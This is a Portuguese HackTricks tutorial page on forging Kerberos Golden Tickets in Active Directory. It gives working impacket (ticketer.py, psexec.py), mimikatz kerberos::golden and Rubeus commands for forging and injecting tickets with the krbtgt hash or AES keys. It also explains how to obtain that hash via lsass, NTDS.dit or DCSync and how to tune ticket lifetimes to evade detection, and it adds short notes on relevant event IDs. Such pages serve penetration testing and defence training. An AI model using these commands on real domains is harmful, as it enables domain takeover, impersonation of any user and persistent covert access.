# Golden Ticket

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Golden ticket

Um **TGT válido como qualquer usuário** pode ser criado **usando o hash NTLM da conta krbtgt do AD**. A vantagem de forjar um TGT em vez de TGS é poder **acessar qualquer serviço** (ou máquina) no domínio e o usuário impostor.\
Além disso, as **credenciais** do **krbtgt** **nunca** são **alteradas** automaticamente.

O **hash NTLM** da conta **krbtgt** pode ser **obtido** a partir do **processo lsass** ou do arquivo **NTDS.dit** de qualquer DC no domínio. Também é possível obter esse NTLM por meio de um **ataque DCsync**, que pode ser realizado com o módulo [lsadump::dcsync](https://github.com/gentilkiwi/mimikatz/wiki/module-\~-lsadump) do Mimikatz ou o exemplo do impacket [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py). Geralmente, **privilégios de administrador do domínio ou similares são necessários**, independentemente da técnica utilizada.

Também deve ser levado em conta que é possível E **PREFERÍVEL** (opsec) **forjar tickets usando as chaves Kerberos AES (AES128 e AES256)**.

{% code title="Do Linux" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
```markdown
{% endcode %}

{% code title="Do Windows" %}
```
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**Uma vez** que você tenha o **Golden Ticket injetado**, você pode acessar os arquivos compartilhados **(C$)**, e executar serviços e WMI, então você poderia usar **psexec** ou **wmiexec** para obter um shell (parece que você não pode obter um shell via winrm).

### Contornando detecções comuns

As maneiras mais frequentes de detectar um Golden Ticket são **inspecionando o tráfego Kerberos** na rede. Por padrão, o Mimikatz **assina o TGT por 10 anos**, o que se destacará como anômalo em solicitações TGS subsequentes feitas com ele.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Use os parâmetros `/startoffset`, `/endin` e `/renewmax` para controlar o deslocamento inicial, a duração e as renovações máximas (todos em minutos).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Infelizmente, a duração do TGT não é registrada nos eventos 4769, então você não encontrará essa informação nos logs de eventos do Windows. No entanto, o que você pode correlacionar é **ver 4769's **_**sem**_** um 4768 anterior**. Não é **possível solicitar um TGS sem um TGT**, e se não há registro de um TGT emitido, podemos inferir que foi forjado offline.

Para **burlar essa detecção**, verifique os diamond tickets:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### Mitigação

* 4624: Logon de Conta
* 4672: Logon de Admin
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Outros pequenos truques que os defensores podem fazer é **alertar sobre 4769's para usuários sensíveis** como a conta de administrador de domínio padrão.

[**Mais informações sobre Golden Ticket em ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas dicas de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>
